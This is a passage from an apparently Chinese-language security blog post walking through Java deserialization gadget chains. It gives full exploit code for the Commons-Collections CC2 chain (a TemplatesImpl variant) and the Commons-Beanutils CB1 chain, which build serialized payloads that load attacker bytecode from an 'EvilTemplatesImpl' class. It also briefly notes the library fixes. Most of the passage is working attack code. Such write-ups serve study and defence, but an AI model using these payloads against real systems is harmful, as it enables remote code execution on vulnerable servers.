</span></span><span style=display:flex><span>        <span style=color:#111>oos</span><span style=color:#f92672>.</span><span style=color:#75af00>writeObject</span><span style=color:#f92672>(</span><span style=color:#111>queue</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>oos</span><span style=color:#f92672>.</span><span style=color:#75af00>close</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>out</span><span style=color:#f92672>.</span><span style=color:#75af00>println</span><span style=color:#f92672>(</span><span style=color:#111>barr</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>ObjectInputStream</span> <span style=color:#111>ois</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ObjectInputStream</span><span style=color:#f92672>(</span><span style=color:#00a8c8>new</span> <span style=color:#111>ByteArrayInputStream</span><span style=color:#f92672>(</span><span style=color:#111>barr</span><span style=color:#f92672>.</span><span style=color:#75af00>toByteArray</span><span style=color:#f92672>()));</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Object</span> <span style=color:#111>o</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>Object</span><span style=color:#f92672>)</span><span style=color:#111>ois</span><span style=color:#f92672>.</span><span style=color:#75af00>readObject</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>Object</span> <span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#111>String</span> <span style=color:#111>fieldName</span><span style=color:#f92672>,</span> <span style=color:#111>Object</span> <span style=color:#111>value</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Field</span> <span style=color:#111>field</span> <span style=color:#f92672>=</span> <span style=color:#111>obj</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>().</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#111>fieldName</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>field</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>field</span><span style=color:#f92672>.</span><span style=color:#75af00>set</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#111>value</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><h3 id=templatesimpl>TemplatesImpl</h3><p>把exp改造为TemplatesImpl的无transformer数组版</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javassist.ClassPool</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javassist.CtClass</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections4.Transformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections4.comparators.TransformingComparator</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections4.functors.InvokerTransformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ByteArrayInputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ByteArrayOutputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ObjectInputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ObjectOutputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.lang.reflect.Field</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.Comparator</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.PriorityQueue</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>CommonsCollections2TemplatesImpl</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>Object</span> <span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#111>String</span> <span style=color:#111>fieldName</span><span style=color:#f92672>,</span> <span style=color:#111>Object</span> <span style=color:#111>value</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Field</span> <span style=color:#111>field</span> <span style=color:#f92672>=</span> <span style=color:#111>obj</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>().</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#111>fieldName</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>field</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>field</span><span style=color:#f92672>.</span><span style=color:#75af00>set</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#111>value</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>protected</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>byte</span><span style=color:#f92672>[]</span> <span style=color:#75af00>getBytescode</span><span style=color:#f92672>()</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>ClassPool</span> <span style=color:#111>pool</span> <span style=color:#f92672>=</span> <span style=color:#111>ClassPool</span><span style=color:#f92672>.</span><span style=color:#75af00>getDefault</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>CtClass</span> <span style=color:#111>clazz</span> <span style=color:#f92672>=</span> <span style=color:#111>pool</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>evil</span><span style=color:#f92672>.</span><span style=color:#75af00>EvilTemplatesImpl</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>.</span><span style=color:#75af00>getName</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>clazz</span><span style=color:#f92672>.</span><span style=color:#75af00>toBytecode</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>main</span><span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>args</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>TemplatesImpl</span> <span style=color:#111>obj</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>TemplatesImpl</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;_bytecodes&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#00a8c8>byte</span><span style=color:#f92672>[][]{</span><span style=color:#111>getBytescode</span><span style=color:#f92672>()});</span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;_name&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;HelloTemplatesImpl&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;_tfactory&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>TransformerFactoryImpl</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>Transformer</span> <span style=color:#111>transformer</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>InvokerTransformer</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;toString&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Comparator</span> <span style=color:#111>comparator</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>TransformingComparator</span><span style=color:#f92672>(</span><span style=color:#111>transformer</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>PriorityQueue</span> <span style=color:#111>queue</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>PriorityQueue</span><span style=color:#f92672>(</span><span style=color:#111>2</span><span style=color:#f92672>,</span> <span style=color:#111>comparator</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>queue</span><span style=color:#f92672>.</span><span style=color:#75af00>add</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>queue</span><span style=color:#f92672>.</span><span style=color:#75af00>add</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>transformer</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;iMethodName&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;newTransformer&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>ByteArrayOutputStream</span> <span style=color:#111>barr</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ByteArrayOutputStream</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>ObjectOutputStream</span> <span style=color:#111>oos</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ObjectOutputStream</span><span style=color:#f92672>(</span><span style=color:#111>barr</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>oos</span><span style=color:#f92672>.</span><span style=color:#75af00>writeObject</span><span style=color:#f92672>(</span><span style=color:#111>queue</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>oos</span><span style=color:#f92672>.</span><span style=color:#75af00>close</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>out</span><span style=color:#f92672>.</span><span style=color:#75af00>println</span><span style=color:#f92672>(</span><span style=color:#111>barr</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>ObjectInputStream</span> <span style=color:#111>ois</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ObjectInputStream</span><span style=color:#f92672>(</span><span style=color:#00a8c8>new</span> <span style=color:#111>ByteArrayInputStream</span><span style=color:#f92672>(</span><span style=color:#111>barr</span><span style=color:#f92672>.</span><span style=color:#75af00>toByteArray</span><span style=color:#f92672>()));</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Object</span> <span style=color:#111>o</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>Object</span><span style=color:#f92672>)</span><span style=color:#111>ois</span><span style=color:#f92672>.</span><span style=color:#75af00>readObject</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><h3 id=修复>修复</h3><p>这条CC2是cc4限定，因为<code>org.apache.commons.collections4.comparators.TransformingComparator</code>在之前版本是没有<code>Serializable</code>接口的，无法在序列化中使用</p><p>在cc3.2.2版中通过添加<code>FunctorUtils#checkUnsafeSerialization</code>来检测反序列化是否安全，如果没有设置<code>org.apache.commons.collections.enableUnsafeSerialization=true</code>，会抛出异常</p><p>这个检查在常见的危险Transformer类（Instantiate, Invoker, Prototype, CloneTransformer）里的readObject调用</p><p>在cc4.1版中，这几个类没有Serializable接口，彻底无法序列化了</p><h2 id=cb1>CB1</h2><p>Commons Beanutils，顾名思义封装了对java bean的一些操作方法，比如可以直接调用java bean的getter方法</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#111>PropertyUtils</span><span style=color:#f92672>.</span><span style=color:#75af00>getProperty</span><span style=color:#f92672>(</span><span style=color:#00a8c8>new</span> <span style=color:#111>Cat</span><span style=color:#f92672>(),</span> <span style=color:#d88200>&#34;name&#34;</span><span style=color:#f92672>);</span>
</span></span></code></pre></div><p>这里会自动找到name属性的方法，即getName，除此之外这个方法还支持递归获取属性</p><p>在上面的CC2中我们使用了PriorityQueue，在它的排序中涉及到Comparator接口的compare方法，最后触发transform，在CB中也存在一个可利用的Comparator对象，BeanComparator</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>int</span> <span style=color:#75af00>compare</span><span style=color:#f92672>(</span><span style=color:#111>T</span> <span style=color:#111>o1</span><span style=color:#f92672>,</span> <span style=color:#111>T</span> <span style=color:#111>o2</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>property</span> <span style=color:#f92672>==</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>internalCompare</span><span style=color:#f92672>(</span><span style=color:#111>o1</span><span style=color:#f92672>,</span> <span style=color:#111>o2</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span> <span style=color:#00a8c8>else</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>Object</span> <span style=color:#111>value1</span> <span style=color:#f92672>=</span> <span style=color:#111>PropertyUtils</span><span style=color:#f92672>.</span><span style=color:#75af00>getProperty</span><span style=color:#f92672>(</span><span style=color:#111>o1</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>property</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>Object</span> <span style=color:#111>value2</span> <span style=color:#f92672>=</span> <span style=color:#111>PropertyUtils</span><span style=color:#f92672>.</span><span style=color:#75af00>getProperty</span><span style=color:#f92672>(</span><span style=color:#111>o2</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>property</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>internalCompare</span><span style=color:#f92672>(</span><span style=color:#111>value1</span><span style=color:#f92672>,</span> <span style=color:#111>value2</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>IllegalAccessException</span> <span style=color:#111>var5</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#111>RuntimeException</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;IllegalAccessException: &#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>var5</span><span style=color:#f92672>.</span><span style=color:#75af00>toString</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>InvocationTargetException</span> <span style=color:#111>var6</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#111>RuntimeException</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;InvocationTargetException: &#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>var6</span><span style=color:#f92672>.</span><span style=color:#75af00>toString</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>NoSuchMethodException</span> <span style=color:#111>var7</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#111>RuntimeException</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;NoSuchMethodException: &#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>var7</span><span style=color:#f92672>.</span><span style=color:#75af00>toString</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>传入两个对象，如果property为空则直接比较对象，否则用getProperty取出属性比较，调用对象的getter</p><p>回想当时TemplatesImpl的调用链</p><pre tabindex=0><code>TemplateImpl#getOutputProperties	public
-&gt; TemplateImpl#newTransformer		public
-&gt; TemplateImpl#getTransletInstance
-&gt; TemplateImpl#defineTransletClasses
-&gt; TemplateImpl#defineClass			default
</code></pre><p>注意到<code>getOutputProperties</code>，是触发后面的关键</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>synchronized</span> <span style=color:#111>Properties</span> <span style=color:#75af00>getOutputProperties</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>newTransformer</span><span style=color:#f92672>().</span><span style=color:#75af00>getOutputProperties</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span><span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>TransformerConfigurationException</span> <span style=color:#111>e</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>它就是一个getter！跟前面的结合起来</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#111>PropertyUtils</span><span style=color:#f92672>.</span><span style=color:#75af00>getProperty</span><span style=color:#f92672>(</span><span style=color:#111>o1</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;outputProperties&#34;</span><span style=color:#f92672>);</span>
</span></span></code></pre></div><p>当o1为TemplatesImpl对象时，就会调用getOutputProperties</p><p>构造链子</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ByteArrayInputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ByteArrayOutputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ObjectInputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ObjectOutputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.lang.reflect.Field</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.PriorityQueue</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javassist.ClassPool</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.beanutils.BeanComparator</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>CommonsBeanutils1</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>Object</span> <span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#111>String</span> <span style=color:#111>fieldName</span><span style=color:#f92672>,</span> <span style=color:#111>Object</span> <span style=color:#111>value</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Field</span> <span style=color:#111>field</span> <span style=color:#f92672>=</span> <span style=color:#111>obj</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>().</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#111>fieldName</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>field</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>field</span><span style=color:#f92672>.</span><span style=color:#75af00>set</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#111>value</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>main</span><span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>args</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>TemplatesImpl</span> <span style=color:#111>obj</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>TemplatesImpl</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;_bytecodes&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#00a8c8>byte</span><span style=color:#f92672>[][]{</span>
</span></span><span style=display:flex><span>                <span style=color:#111>ClassPool</span><span style=color:#f92672>.</span><span style=color:#75af00>getDefault</span><span style=color:#f92672>().</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>evil</span><span style=color:#f92672>.</span><span style=color:#75af00>EvilTemplatesImpl</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>.</span><span style=color:#75af00>getName</span><span style=color:#f92672>()).</span><span style=color:#75af00>toBytecode</span><span style=color:#f92672>()</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>});</span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;_name&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;HelloTemplatesImpl&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;_tfactory&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>TransformerFactoryImpl</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>final</span> <span style=color:#111>BeanComparator</span> <span style=color:#111>comparator</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>BeanComparator</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>final</span> <span style=color:#111>PriorityQueue</span><span style=color:#f92672>&lt;</span><span style=color:#111>Object</span><span style=color:#f92672>&gt;</span> <span style=color:#111>queue</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>PriorityQueue</span><span style=color:#f92672>&lt;</span><span style=color:#111>Object</span><span style=color:#f92672>&gt;(</span><span style=color:#111>2</span><span style=color:#f92672>,</span> <span style=color:#111>comparator</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// stub data for replacement later
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>queue</span><span style=color:#f92672>.</span><span style=color:#75af00>add</span><span style=color:#f92672>(</span><span style=color:#111>1</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>queue</span><span style=color:#f92672>.</span><span style=color:#75af00>add</span><span style=color:#f92672>(</span><span style=color:#111>1</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>comparator</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;property&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;outputProperties&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>queue</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;queue&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#f92672>[]{</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#111>obj</span><span style=color:#f92672>});</span>
</span></span><span style=display:flex><span>
